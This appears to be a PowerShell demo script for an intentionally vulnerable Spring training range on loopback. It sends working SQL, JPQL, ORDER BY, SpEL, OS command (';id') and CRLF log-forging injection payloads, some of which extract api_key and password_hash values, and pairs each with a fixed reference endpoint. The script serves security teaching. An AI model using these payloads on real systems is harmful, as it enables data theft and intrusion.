# PowerShell wrapper for attacks/05-injection.sh
# Run from PowerShell: .\scripts\run_attack_m05.ps1

$ErrorActionPreference = "Stop"
$ROOT = "C:\Users\uniqo\Downloads\spring-vuln-range\spring-vuln-range"
$PORT = 8085
$BASE = "http://127.0.0.1:${PORT}"

function Write-Title($msg) {
    Write-Host ""
    Write-Host "-------------------------------------------------------------------------------"
    Write-Host "  $msg"
    Write-Host "-------------------------------------------------------------------------------"
}

function Write-Note($msg) {
    Write-Host "  >> $msg"
}

function Invoke-Request($method, $path, $body, $contentType) {
    $url = "${BASE}${path}"
    $params = @{ Uri = $url; Method = $method; UseBasicParsing = $true }
    if ($contentType) { $params["ContentType"] = $contentType }
    if ($body) { $params["Body"] = $body }
    try {
        $response = Invoke-WebRequest @params
        Write-Host "  $method $path"
        Write-Host "    $([string]$response.Content)"
        Write-Host "    <status:$($response.StatusCode)>"
    } catch {
        $status = if ($_.Exception.Response) { $_.Exception.Response.StatusCode.value__ } else { 0 }
        Write-Host "  $method $path"
        Write-Host "    <status:$status>"
    }
}

# Check if service is up
try {
    Invoke-WebRequest -Uri "${BASE}/" -UseBasicParsing -TimeoutSec 3 > $null
} catch {
    Write-Host "Module on port $PORT is not answering."
    Write-Host "Start it with: scripts\run-module.sh m05-injection"
    exit 1
}

Write-Host "==============================================================================="
Write-Host " 05 · injection: SQL, LIKE, ORDER BY, SpEL, command, log forging (port ${PORT})"
Write-Host "==============================================================================="
Write-Host " target: 127.0.0.1 (loopback) - educational range, intentionally vulnerable"

# Title 1
Write-Title "1. SQL injection through JDBC string concatenation"
Invoke-Request "GET" "/vuln5/subscriptions?email=alice@example.invalid"
Write-Note "Boolean-based bypass: the WHERE clause is neutralised, every row comes back."
Invoke-Request "GET" "/vuln5/subscriptions?email=x'%20OR%20'1'='1"
Write-Note "UNION against a table the application user can read (see integration_credentials in data.sql)."
Invoke-Request "GET" "/vuln5/subscriptions?email=x'%20UNION%20SELECT%20service_name,env,api_key,1%20FROM%20integration_credentials%20--"
Write-Note "Reference implementation binds the value and validates its shape first:"
Invoke-Request "GET" "/safe5/subscriptions?email=x'%20OR%20'1'='1"
Invoke-Request "GET" "/safe5/subscriptions?email=alice@example.invalid"

# Title 2
Write-Title "2. LIKE wildcards are not escaped"
Invoke-Request "GET" "/vuln5/search?q=%25"
Write-Note "'%' as the search term matches every row: data leak plus a full table scan (cheap DoS)."
Invoke-Request "GET" "/safe5/search?q=%25"
Write-Note "Reference implementation escapes %, _ and the escape character, then binds with ESCAPE '\'."

# Title 3
Write-Title "3. ORDER BY injection (identifiers cannot be parameterised)"
Invoke-Request "GET" "/vuln5/list?sort=id&dir=asc"
Write-Note "Blind extraction: a CASE expression decides the sort order, the response differs by condition."
Invoke-Request "GET" "/vuln5/list?sort=CASE%20WHEN%20(1=1)%20THEN%20id%20ELSE%20plan%20END&dir=asc"
Write-Note "Error-based: the DB error text is returned, which discloses the schema."
Invoke-Request "GET" "/vuln5/list?sort=(SELECT%20password_hash%20FROM%20subscriber)&dir=asc"
Write-Note "Reference implementation resolves the identifier from an allow-list:"
Invoke-Request "GET" "/safe5/list?sort=(SELECT%201)&dir=asc"
Invoke-Request "GET" "/safe5/list?sort=plan&dir=desc"

# Title 4
Write-Title "4. JPQL and native queries built by concatenation"
Invoke-Request "GET" "/vuln5/jpa?plan=ESPD-BASIC"
Invoke-Request "GET" "/vuln5/jpa?plan=x'%20OR%20'1'='1"
Invoke-Request "GET" "/vuln5/native?tenantId=T-100"
Invoke-Request "GET" "/vuln5/native?tenantId=x'%20OR%20'1'='1"
Write-Note "'It is not raw SQL, so it is safe' is false for JPQL too."
Invoke-Request "GET" "/safe5/jpa?plan=ESPD-BASIC&tenantId=T-100"
Invoke-Request "GET" "/safe5/jpa?plan=x'%20OR%20'1'='1&tenantId=T-100"

# Title 5
Write-Title "5. SpEL injection: user input reaching the expression parser"
Write-Note "Default mode is a read-only context: property access leaks object structure, not code."
Invoke-Request "GET" "/vuln5/report?expr=plan"
Invoke-Request "GET" "/vuln5/report?expr=tenantId.length()"
Write-Note "Set VULNRANGE_ALLOW_SPEL_TYPES=true to see the unsandboxed shape (type references enabled)."
Write-Note "That mode is code execution by definition, so it is opt-in and documented, never the default."
Write-Note "Reference implementation: request selects a template key from a registry."
Invoke-Request "GET" "/safe5/report?template=priceWithVat"
Invoke-Request "GET" "/safe5/report?template=T(java.lang.Runtime).getRuntime()"

# Title 6
Write-Title "6. OS command injection (shell-composed command)"
Write-Note "This sink is disabled unless VULNRANGE_ALLOW_EXEC=true, because running it is arbitrary"
Write-Note "command execution on the host and the range must not ship that switched on."
Invoke-Request "POST" "/vuln5/tools/ping?host=127.0.0.1%3Bid" "" "application/x-www-form-urlencoded"
Write-Host "  start the module with VULNRANGE_ALLOW_EXEC=true to see the concatenated 'sh -c' sink execute."
Write-Note "Reference implementation: validate the host, resolve it, pass it as a single argv element."
Invoke-Request "POST" "/safe5/tools/ping?host=127.0.0.1%3Bid" "" "application/x-www-form-urlencoded"

# Title 7
Write-Title "7. Log forging via CRLF (audit-trail integrity)"
$FORGED = "login ok user=alice%0A2026-10-30 INFO  payment ok user=attacker amount=0.00"
Invoke-Request "POST" "/vuln5/audit/message?message=${FORGED}" "" "application/x-www-form-urlencoded"
Write-Note "Two log lines for one request: a forged 'payment ok' entry is now in the audit index."
Invoke-Request "POST" "/safe5/audit/message?message=${FORGED}" "" "application/x-www-form-urlencoded"
Write-Note "Reference implementation strips CR/LF/NUL and bounds the length before logging."

Write-Host ""
Write-Host "==============================================================================="
Write-Host " done · details and fixes: docs/05-injection.md"
Write-Host "==============================================================================="
